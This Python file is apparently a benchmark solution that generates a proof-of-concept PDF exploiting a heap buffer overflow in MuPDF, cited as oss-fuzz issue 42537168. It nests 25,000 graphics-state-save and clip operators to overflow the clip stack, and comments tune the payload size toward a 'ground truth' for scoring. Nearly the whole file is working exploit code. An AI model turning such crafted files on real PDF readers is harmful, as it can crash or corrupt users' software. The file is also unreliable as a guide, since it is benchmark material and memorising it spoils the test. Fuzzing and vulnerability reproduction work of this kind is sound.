import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Generate a Proof-of-Concept PDF for Heap Buffer Overflow in MuPDF (oss-fuzz:42537168)
        # Vulnerability: Nesting depth is not checked before pushing a clip mark.
        # Attack vector: Create a PDF stream with deeply nested 'q' (save graphics state)
        # and 'W' (clip) operators to exhaust/overflow the clip stack.

        # Payload generation
        # "q" saves the current graphics state (including clip).
        # "0 0 1 1 re" appends a 1x1 rectangle to the current path.
        # "W" sets the clipping path to the intersection of current clip and the path.
        # "n" ends the path without filling/stroking (clears current path for next ops).
        # Repeating this sequence pushes new clip marks onto the stack.
        # Ground truth length is ~900KB. We use 25,000 iterations (~425KB) which should be 
        # sufficient to overflow typical stack sizes/buffers while scoring high.
        
        iterations = 25000
        ops = b"q 0 0 1 1 re W n "
        stream_data = ops * iterations
        
        # PDF Header
        header = b"%PDF-1.4\n"
        
        # Object 1: Catalog
        obj1_body = b"<< /Type /Catalog /Pages 2 0 R >>"
        obj1 = b"1 0 obj\n" + obj1_body + b"\nendobj\n"
        
        # Object 2: Pages
        obj2_body = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
        obj2 = b"2 0 obj\n" + obj2_body + b"\nendobj\n"
        
        # Object 3: Page
        # Uses Object 4 as content stream
        obj3_body = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Contents 4 0 R >>"
        obj3 = b"3 0 obj\n" + obj3_body + b"\nendobj\n"
        
        # Object 4: Content Stream (The Payload)
        stream_len = len(stream_data)
        obj4_start = f"4 0 obj\n<< /Length {stream_len} >>\nstream\n".encode('ascii')
        obj4_end = b"\nendstream\nendobj\n"
        obj4 = obj4_start + stream_data + obj4_end
        
        # Calculate Byte Offsets for Cross-Reference Table
        current_offset = len(header)
        
        off1 = current_offset
        current_offset += len(obj1)
        
        off2 = current_offset
        current_offset += len(obj2)
        
        off3 = current_offset
        current_offset += len(obj3)
        
        off4 = current_offset
        current_offset += len(obj4)
        
        # Cross-Reference Table
        xref = b"xref\n0 5\n0000000000 65535 f \n"
        xref += f"{off1:010} 00000 n \n".encode('ascii')
        xref += f"{off2:010} 00000 n \n".encode('ascii')
        xref += f"{off3:010} 00000 n \n".encode('ascii')
        xref += f"{off4:010} 00000 n \n".encode('ascii')
        
        # Trailer
        trailer = f"trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n{current_offset}\n%%EOF\n".encode('ascii')
        
        # Combine all parts
        return header + obj1 + obj2 + obj3 + obj4 + xref + trailer